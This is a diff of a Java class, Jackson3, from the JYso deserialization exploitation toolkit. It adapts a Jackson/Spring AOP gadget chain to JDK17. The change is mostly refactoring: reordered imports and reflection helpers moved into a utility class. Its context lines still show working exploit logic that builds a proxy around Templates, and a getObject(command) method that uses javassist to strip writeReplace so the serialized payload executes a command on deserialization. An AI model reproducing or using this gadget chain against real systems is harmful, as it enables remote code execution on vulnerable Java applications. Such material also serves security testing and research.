@@ -3,26 +3,23 @@ package com.qi4l.JYso.gadgets;
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
-import com.qi4l.JYso.gadgets.utils.SuClassLoader;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
-
-import org.springframework.aop.framework.AdvisedSupport;
-
+import com.qi4l.JYso.gadgets.utils.SuClassLoader;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
+import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.framework.AdvisorChainFactory;
 
 import javax.xml.transform.Templates;
-
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
-import java.lang.reflect.*;
-
 import java.util.Vector;
 
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
+import static com.qi4l.JYso.gadgets.utils.Reflections.getFieldValue;
+import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
 
 
 //Jackson2链的JDK17改造
@@ -46,7 +43,7 @@ public class Jackson3 implements ObjectPayload<Object> {
         Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
         constructor.setAccessible(true);
         InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
-        Object            proxy   = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
 
         return proxy;
     }
@@ -76,30 +73,10 @@ public class Jackson3 implements ObjectPayload<Object> {
         return list;
     }
 
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = null;
-        Class c     = obj.getClass();
-        for (int i = 0; i < 5; i++) {
-            try {
-                field = c.getDeclaredField(fieldName);
-            } catch (NoSuchFieldException e) {
-                c = c.getSuperclass();
-            }
-        }
-        field.setAccessible(true);
-        return field.get(obj);
-    }
-
-    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
-        Field dField = obj.getClass().getDeclaredField(field);
-        dField.setAccessible(true);
-        dField.set(obj, val);
-    }
-
     @Override
     public Object getObject(final String command) throws Exception {
         try {
-            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
             CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
             ctClass.removeMethod(writeReplace);
             ctClass.toClass();
@@ -121,6 +98,4 @@ public class Jackson3 implements ObjectPayload<Object> {
 
         return getEventListenerList(node);
     }
-
-
 }
